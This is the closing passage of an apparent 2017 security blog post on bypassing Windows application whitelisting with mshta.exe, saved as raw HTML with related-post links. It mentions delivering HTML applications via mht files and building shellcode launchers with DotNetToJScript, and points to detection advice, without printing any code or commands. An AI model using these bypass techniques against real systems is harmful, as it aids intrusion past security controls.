<p>These notes are other aspects of HTML applications that I recommend exploring. For example. the file extension does not matter. HTA files only require the &#8220;application/hta&#8221; MIME type to work.</p>
<p><img class="aligncenter size-full wp-image-204" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_casey_tweet1.png" alt="" width="616" height="411" /> <img class="aligncenter size-large wp-image-205" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_casey_tweet2.png" alt="" width="600" height="408" /> <img class="aligncenter size-large wp-image-206" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_casey_tweet.png" alt="" width="627" height="546" /></p>
<p>Here&#8217;s another very interesting trick Casey mentions on twitter.</p>
<p><img class="aligncenter size-full wp-image-207" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_casey_tweet3.png" alt="" width="681" height="400" /></p>
<p>You can read more about this <a href="http://blog.talosintelligence.com/2016/11/fareit-spam-mht.html">here</a>. I created one of these and weaponized it, however, this blog post is not going to cover delivering HTML applications via &#8220;mht&#8221; files. You can also utilize James Foreshaw&#8217;s (<a href="https://twitter.com/tiraniddo">@tiraniddo</a>) <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> to create a pure JScript shellcode launcher without the need for a COM scriptlet. We (<a href="https://twitter.com/t3ntman">@t3ntman</a> and I) have made a template for these payloads and found a bug in  <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> in the process. James fixed the bug within an hour and now it works. We&#8217;ll be releasing that soon, stay tuned. Good luck in your &#8220;mshta.exe&#8221; adventures!</p>
<h1>Detection</h1>
<p>In cases where you cannot block &#8220;mshta.exe&#8221;, <a href="https://twitter.com/kwm">Keith (@kwm)</a> from <a href="https://twitter.com/redcanaryco">@redcanaryco</a> shares insights on detecting malicious activity.</p>
<p><img class="aligncenter size-full wp-image-229" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/keith_mshta_detection.png" alt="" width="674" height="401" /></p>
<h1>Credits</h1>
<ul>
<li>Hunter Hardman (<a href="https://twitter.com/t3ntman">@t3ntman</a>)</li>
<li>James Foreshaw (<a href="https://twitter.com/tiraniddo">@tiraniddo</a>)</li>
<li>Casey Smith (<a href="https://twitter.com/subTee">@subTee)</a></li>
<li>Larry Spohn (<a href="https://twitter.com/Spoonman1091">@Spoonman1091)</a></li>
<li>Ben Ten (<a href="https://twitter.com/Ben0xA">@Ben0xA</a>)</li>
<li>Vincent (<a href="https://twitter.com/vysecurity">@vysecurity</a>)</li>
</ul>
      </div>
      <footer class="post-footer clearfix">
                <div class="row entry-meta justify-content-between align-items-center">
                          </div>
      </footer>
    </section><!-- .entry-content -->
  </div><!-- .post-entry -->
  </article><section class="post-related-articles czr-carousel " >
  <header class="row flex-row">
    <h3 class="related-posts_title col">You may also like</h3>
          <div class="related-posts_nav col col-auto">
        <span class="btn btn-skin-dark inverted czr-carousel-prev slider-control czr-carousel-control disabled icn-left-open-big" title="Previous related articles" tabindex="0"></span>
        <span class="btn btn-skin-dark inverted czr-carousel-next slider-control czr-carousel-control icn-right-open-big" title="Next related articles" tabindex="0"></span>
      </div>
      </header>
  <div class="row grid-container__square-mini carousel-inner">
  <article id="post-174_related_posts" class="col-6 grid-item czr-related-post post-174 post type-post status-publish format-standard hentry category-application-whitelisting category-application-whitelisting-bypass category-information-security category-security-research" >
  <div class="grid__item flex-wrap flex-lg-nowrap flex-row">
    <section class="tc-thumbnail entry-media__holder col-12 col-lg-6 czr__r-w1by1" >
  <div class="entry-media__wrapper czr__r-i js-centering">
        <a class="bg-link" rel="bookmark" title="Permalink to:&nbsp;Application Whitelisting Bypass: msbuild.exe" href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/"></a>
  <img width="510" height="28" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/greasct_msbuild_shell.png" class="attachment-tc-sq-thumb tc-thumb-type-attachment czr-img" alt="" /><div class="post-action btn btn-skin-dark-shaded inverted"><a href="https://blog.conscioushacker.io/wp-content/uploads/2017/11/greasct_msbuild_shell.png" class="expand-img icn-expand"></a></div>  </div>
</section>      <section class="tc-content entry-content__holder col-12 col-lg-6 czr__r-w1by1">
        <div class="entry-content__wrapper">
        <header class="entry-header " >
  <div class="entry-header-inner ">
          <div class="entry-meta post-info">
          Published <a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/" title="Permalink to:&nbsp;Application Whitelisting Bypass: msbuild.exe" rel="bookmark"><time class="entry-date published updated" datetime="2017-11-17T09:25:16+00:00">November 17, 2017</time></a>      </div>
        <h2 class="entry-title ">
      <a class="czr-title" href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/" title="Permalink to Application Whitelisting Bypass: msbuild.exe" rel="bookmark">Application Whitelisting Bypass: msbuild.exe</a>
    </h2>
      </div>
</header><div class="tc-content-inner entry-summary"  >
            <div class="czr-wp-the-content">
              <p>Background Casey Smith (@subTee) discovered a Microsoft binary called &#8220;msbuild.exe&#8221;. He wrote a blog on Tuesday, September 13, 2016 titled &#8220;Bypassing Application Whitelisting [&hellip;]</p>
          </div>
      </div>        </div>
      </section>
  </div>
</article><article id="post-74_related_posts" class="col-6 grid-item czr-related-post post-74 post type-post status-publish format-standard hentry category-conference-talk category-development category-information-security category-security-research" >
  <div class="grid__item flex-wrap flex-lg-nowrap flex-row">
    <section class="tc-thumbnail entry-media__holder col-12 col-lg-6 czr__r-w1by1" >
  <div class="entry-media__wrapper czr__r-i js-centering">
        <a class="bg-link" rel="bookmark" title="Permalink to:&nbsp;Evading Microsoft&#8217;s AutoRuns" href="https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/"></a>
  <img width="179" height="296" src="https://blog.conscioushacker.io/wp-content/uploads/2017/10/celery.gif" class="attachment-tc-sq-thumb tc-thumb-type-attachment czr-img" alt="" /><div class="post-action btn btn-skin-dark-shaded inverted"><a href="https://blog.conscioushacker.io/wp-content/uploads/2017/10/celery.gif" class="expand-img icn-expand"></a></div>  </div>
</section>      <section class="tc-content entry-content__holder col-12 col-lg-6 czr__r-w1by1">
        <div class="entry-content__wrapper">
        <header class="entry-header " >
  <div class="entry-header-inner ">
          <div class="entry-meta post-info">
          Published <a href="https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/" title="Permalink to:&nbsp;Evading Microsoft&#8217;s AutoRuns" rel="bookmark"><time class="entry-date published updated" datetime="2017-10-25T18:35:44+00:00">October 25, 2017</time></a>      </div>
        <h2 class="entry-title ">
      <a class="czr-title" href="https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/" title="Permalink to Evading Microsoft&#8217;s AutoRuns" rel="bookmark">Evading Microsoft&#8217;s AutoRuns</a>
    </h2>
      </div>
</header><div class="tc-content-inner entry-summary"  >
            <div class="czr-wp-the-content">
              <p>Background At DerbyCon 7.0, Chris Bisnett and Kyle Hanslovan gave a talk called &#8220;Evading Autoruns&#8221;. Kyle and Chris demonstrated the ability to &#8220;evade&#8221; the Microsoft [&hellip;]</p>
          </div>
      </div>        </div>
      </section>
  </div>
</article><article id="post-1_related_posts" class="col-6 grid-item czr-related-post post-1 post type-post status-publish format-standard hentry category-conference-talk category-development category-game-development category-gaming category-information-security category-security-research" >
  <div class="grid__item flex-wrap flex-lg-nowrap flex-row">
    <section class="tc-thumbnail entry-media__holder col-12 col-lg-6 czr__r-w1by1" >
  <div class="entry-media__wrapper czr__r-i js-centering">
        <a class="bg-link" rel="bookmark" title="Permalink to:&nbsp;From Gaming to Hacking the Planet" href="https://blog.conscioushacker.io/index.php/2017/07/28/from-gaming-to-hacking-the-planet/"></a>
          <svg class="czr-svg-placeholder thumb-standard-empty" id="5a584c865d5de" viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>

        <script type="text/javascript">
          jQuery( function($){
            $( '#5a584c865d5de' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } );
          });
        </script>
        <img class="czr-img-placeholder" src="https://blog.conscioushacker.io/wp-content/themes/customizr/assets//front/img/thumb-standard-empty.png" alt="From Gaming to Hacking the Planet" data-czr-post-id="5a584c865d5de" />  </div>
</section>      <section class="tc-content entry-content__holder col-12 col-lg-6 czr__r-w1by1">
        <div class="entry-content__wrapper">
        <header class="entry-header " >
  <div class="entry-header-inner ">
          <div class="entry-meta post-info">
          Published <a href="https://blog.conscioushacker.io/index.php/2017/07/28/from-gaming-to-hacking-the-planet/" title="Permalink to:&nbsp;From Gaming to Hacking the Planet" rel="bookmark"><time class="entry-date published updated" datetime="2017-07-28T18:53:06+00:00">July 28, 2017</time></a>      </div>
        <h2 class="entry-title ">
      <a class="czr-title" href="https://blog.conscioushacker.io/index.php/2017/07/28/from-gaming-to-hacking-the-planet/" title="Permalink to From Gaming to Hacking the Planet" rel="bookmark">From Gaming to Hacking the Planet</a>
    </h2>
      </div>
</header><div class="tc-content-inner entry-summary"  >
            <div class="czr-wp-the-content">
              <p>Introduction This is a talk a gave last year at BSides St. Louis and DerbyCon. The purpose was to share how I [&hellip;]</p>
          </div>
      </div>        </div>
      </section>
  </div>
</article><article id="post-42_related_posts" class="col-6 grid-item czr-related-post post-42 post type-post status-publish format-standard hentry category-conference-talk category-development category-information-security category-security-research" >
  <div class="grid__item flex-wrap flex-lg-nowrap flex-row">
    <section class="tc-thumbnail entry-media__holder col-12 col-lg-6 czr__r-w1by1" >
  <div class="entry-media__wrapper czr__r-i js-centering">
        <a class="bg-link" rel="bookmark" title="Permalink to:&nbsp;Borrowing Microsoft Code Signing Certificates" href="https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/"></a>
  <img width="510" height="308" src="https://blog.conscioushacker.io/wp-content/uploads/2017/09/sig.png" class="attachment-tc-sq-thumb tc-thumb-type-attachment czr-img" alt="" srcset="https://blog.conscioushacker.io/wp-content/uploads/2017/09/sig.png 804w, https://blog.conscioushacker.io/wp-content/uploads/2017/09/sig-300x181.png 300w, https://blog.conscioushacker.io/wp-content/uploads/2017/09/sig-768x464.png 768w" sizes="(max-width: 510px) 100vw, 510px" /><div class="post-action btn btn-skin-dark-shaded inverted"><a href="https://blog.conscioushacker.io/wp-content/uploads/2017/09/sig.png" class="expand-img icn-expand"></a></div>  </div>
</section>      <section class="tc-content entry-content__holder col-12 col-lg-6 czr__r-w1by1">
        <div class="entry-content__wrapper">
        <header class="entry-header " >
  <div class="entry-header-inner ">
          <div class="entry-meta post-info">
          Published <a href="https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/" title="Permalink to:&nbsp;Borrowing Microsoft Code Signing Certificates" rel="bookmark"><time class="entry-date published updated" datetime="2017-09-27T22:32:40+00:00">September 27, 2017</time></a>      </div>
        <h2 class="entry-title ">
      <a class="czr-title" href="https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/" title="Permalink to Borrowing Microsoft Code Signing Certificates" rel="bookmark">Borrowing Microsoft Code Signing Certificates</a>
    </h2>
    <div class="post-info"><a class="comments__link" data-anchor-scroll="true" href="https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/#czr-comments-title" title="14 Comments on Borrowing Microsoft Code Signing Certificates" ><span>14 comments</span></a></div>  </div>
</header><div class="tc-content-inner entry-summary"  >
            <div class="czr-wp-the-content">
              <p>Background This past weekend at DerbyCon, Matt Graeber (@mattifestation) was the keynote speaker. He gave a talk called &#8216;Subverting Trust in Windows [&hellip;]</p>
          </div>
      </div>        </div>
      </section>
  </div>
</article>  </div>
</section>

<div id="czr-comments" class="comments-area " >
    <div id="comments" class="comments_container comments czr-comments-block">
  <section class="post-comments">
    	<div id="respond" class="comment-respond">
		<h4 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/#respond" style="display:none;">Cancel reply</a></small></h4>			<form action="https://blog.conscioushacker.io/wp-comments-post.php" method="post" id="commentform" class="czr-form comment-form" novalidate>
				<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='188' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p>			</form>
			</div><!-- #respond -->
	  </section>
</div>  </div>                </div>

                <div class="left sidebar tc-sidebar col-12 col-md-3 order-md-first" >
  <div id="left" class="widget-area" role="complementary">
              <aside class="social-block widget widget_social">
        <div class="social-links">
          <ul class="socials " >
  <li><a rel="nofollow" class="social-icon icon-twitter"  title="Follow us on Twitter" aria-label="Follow us on Twitter" href="https://twitter.com/ConsciousHacker"  target="_blank" ><i class="fa fa-twitter"></i></a></li> <li><a rel="nofollow" class="social-icon icon-github"  title="Follow us on Github" aria-label="Follow us on Github" href="https://github.com/ConsciousHacker"  target="_blank" ><i class="fa fa-github"></i></a></li> <li><a rel="nofollow" class="social-icon icon-feed"  title="Subscribe to my rss feed" aria-label="Subscribe to my rss feed" href="https://blog.conscioushacker.io/index.php/feed/rss/"  target="_blank" ><i class="fa fa-rss"></i></a></li> <li><a rel="nofollow" class="social-icon icon-twitch"  title="Follow us on Twitch" aria-label="Follow us on Twitch" href="https://www.twitch.tv/lopigaming"  target="_blank" ><i class="fa fa-twitch"></i></a></li></ul>
        </div>
      </aside>
              </div>
</div>
            </div><!-- .column-content-wrapper -->

            

          </div><!-- .container -->

          <div id="czr-push-footer" ></div>
    </div><!-- #main-wrapper -->

    
          <div class="container-fluid">
        <div class="post-navigation row " >
  <nav id="nav-below" class="col-12" role="navigation">
    <h2 class="sr-only">Post navigation</h2>
    <ul class="czr_pager row flex-row flex-no-wrap">
      <li class="previous col-5 text-left">
              <span class="sr-only">Previous post</span>
        <span class="nav-previous nav-dir"><a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/" rel="prev"><span class="meta-nav"><i class="arrow icn-left-open-big"></i><span class="meta-nav-title">Application Whitelisting Bypass: msbuild.exe</span></span></a></span>
            </li>
      <li class="nav-back col-2 text-center">
                <a href="https://blog.conscioushacker.io/" title="Back to post list">
          <span><i class="icn-grid-empty"></i></span>
          <span class="sr-only">Back to post list</span>
        </a>
              </li>
      <li class="next col-5 text-right">
            </li>
  </ul>
  </nav>
</div>
      </div>
    
<footer id="footer" class="footer__wrapper" >
  <div id="colophon" class="colophon " >
  <div class="container-fluid">
    <div class="colophon__row row flex-row justify-content-between">
      <div class="col-12 col-sm-auto">
        <div id="footer__credits" class="footer__credits" >
  <p class="czr-copyright">
    <span class="czr-copyright-text">&copy;&nbsp;2018&nbsp;</span><a class="czr-copyright-link" href="https://blog.conscioushacker.io" title="Conscious Hacker">Conscious Hacker</a><span class="czr-rights-text">&nbsp;&ndash;&nbsp;All rights reserved</span>
  </p>
  <p class="czr-credits">
    <span class="czr-designer">
      <span class="czr-wp-powered"><span class="czr-wp-powered-text">Powered by&nbsp;</span><a class="czr-wp-powered-link fa fa-wordpress" title="Powered by WordPress" href="https://wordpress.org/" target="_blank"></a></span><span class="czr-designer-text">&nbsp;&ndash;&nbsp;Designed with the <a class="czr-designer-link" href="https://presscustomizr.com/customizr" title="Customizr theme">Customizr theme</a></span>
    </span>
  </p>
</div>
      </div>
            <div class="col-12 col-sm-auto">
        <div class="social-links">
          <ul class="socials " >
  <li><a rel="nofollow" class="social-icon icon-twitter"  title="Follow us on Twitter" aria-label="Follow us on Twitter" href="https://twitter.com/ConsciousHacker"  target="_blank" ><i class="fa fa-twitter"></i></a></li> <li><a rel="nofollow" class="social-icon icon-github"  title="Follow us on Github" aria-label="Follow us on Github" href="https://github.com/ConsciousHacker"  target="_blank" ><i class="fa fa-github"></i></a></li> <li><a rel="nofollow" class="social-icon icon-feed"  title="Subscribe to my rss feed" aria-label="Subscribe to my rss feed" href="https://blog.conscioushacker.io/index.php/feed/rss/"  target="_blank" ><i class="fa fa-rss"></i></a></li> <li><a rel="nofollow" class="social-icon icon-twitch"  title="Follow us on Twitch" aria-label="Follow us on Twitch" href="https://www.twitch.tv/lopigaming"  target="_blank" ><i class="fa fa-twitch"></i></a></li></ul>
        </div>
      </div>
          </div>
  </div>
</div>
</footer>
    </div><!-- end #tc-page-wrap -->

    <section class="czr-overlay search_o">
  <a href="#" class="search-close_btn search-toggle_btn czr-overlay-toggle_btn"><i class="icn-close"></i></a>
  <div class="overlay-content">
    <div class="search__wrapper">
    <div class="search-form__container " >
  <form action="https://blog.conscioushacker.io/" method="get" class="czr-form search-form">
    <div class="form-group czr-focus">
            <label for="s-5a584c86624f2" id="lsearch-5a584c86624f2"><span>Search</span><i class="icn-search"></i><i class="icn-close"></i></label>
      <input id="s-5a584c86624f2" class="form-control czr-search-field" name="s" type="text" value="" aria-describedby="lsearch-5a584c86624f2" title="Search &hellip;">
    </div>
  </form>
</div>    </div>
  </div>
</section><div class="btn czr-btt czr-btta right" ><i class="icn-up-small"></i></div>
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-includes/js/comment-reply.min.js?ver=4.9.1'></script>
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var SlimStatParams = {"ajaxurl":"https:\/\/blog.conscioushacker.io\/wp-admin\/admin-ajax.php","extensions_to_track":"pdf,doc,xls,zip","outbound_classes_rel_href_to_not_track":"noslimstat,ab-item","ci":"YTo0OntzOjEyOiJjb250ZW50X3R5cGUiO3M6NDoicG9zdCI7czo4OiJjYXRlZ29yeSI7czo5OiI4LDksNSw0LDIiO3M6MTA6ImNvbnRlbnRfaWQiO2k6MTg4O3M6NjoiYXV0aG9yIjtzOjQ6ImxvcGkiO30=.3a799284478d5a816cf685819a07f97b"};
/* ]]> */
</script>
<script type='text/javascript' src='https://cdn.jsdelivr.net/wp/wp-slimstat/tags/4.7.5/wp-slimstat.min.js'></script>
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-includes/js/wp-embed.min.js?ver=4.9.1'></script>
  </body>
  </html>
